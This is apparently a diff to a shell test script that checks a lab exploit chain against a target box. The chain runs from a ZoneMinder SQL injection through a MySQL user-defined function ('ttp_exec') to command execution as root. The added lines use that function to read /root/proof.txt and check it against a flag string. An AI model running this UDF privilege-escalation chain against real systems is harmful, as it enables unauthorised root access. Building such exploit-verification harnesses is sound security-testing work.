@@ -7,11 +7,14 @@ plugin_dir=$(mysql --user=zmuser --password=zmpass -Nse 'SELECT @@plugin_dir')
 [[ "$plugin_dir" = /* ]] || { echo 'FAIL: MySQL plugin directory is not absolute' >&2; exit 1; }
 plugin_path="${plugin_dir%/}/ttp_udf_probe.so"
 marker="/tmp/pebbles-udf-root-proof"
+flagmarker="/tmp/pebbles-udf-root-flag"
 test -s /tmp/ttp_udf_probe.so
+# A low-privilege user must NOT be able to read the actual root proof directly.
+! test -r /root/proof.txt || { echo "FAIL: direct root flag access unexpectedly permitted" >&2; exit 1; }
 [[ ! -e "$plugin_path" ]] || { echo 'FAIL: test UDF already in plugin directory' >&2; exit 1; }
 cleanup() {
     mysql --user=zmuser --password=zmpass -Nse 'DROP FUNCTION IF EXISTS ttp_exec' >/dev/null 2>&1 || true
-    rm -f "$plugin_path" "$marker" /tmp/ttp_udf_probe.so || true
+    rm -f "$plugin_path" "$marker" "$flagmarker" /tmp/ttp_udf_probe.so || true
 }
 trap cleanup EXIT
 
@@ -43,4 +46,8 @@ inject "SELECT ttp_exec('id -u > $marker')"
 test -s "$marker" || { echo 'FAIL: actual UDF command did not run' >&2; exit 1; }
 [[ "$(cat "$marker")" = 0 ]] || { echo 'FAIL: actual UDF command was not root' >&2; exit 1; }
 [[ "$(stat -c '%u' "$marker")" = 0 ]] || { echo 'FAIL: root-owned UDF proof missing' >&2; exit 1; }
-echo 'PASS: ZoneMinder SQLi -> MySQL plugin write -> UDF registration -> real UID 0 execution'
+inject "SELECT ttp_exec('cat /root/proof.txt > $flagmarker')"
+test -s "$flagmarker" || { echo 'FAIL: UDF could not read the root proof' >&2; exit 1; }
+[[ "$(cat "$flagmarker")" = 'TTP{pebbles_unverified_demo_not_for_release}' ]] || { echo 'FAIL: UDF root proof content mismatch' >&2; exit 1; }
+[[ "$(stat -c '%u' "$flagmarker")" = 0 ]] || { echo 'FAIL: UDF did not write the proof as OS root' >&2; exit 1; }
+echo 'PASS: unprivileged www-data -> genuine ZoneMinder SQLi -> MySQL plugin -> real UID 0 -> /root/proof.txt'
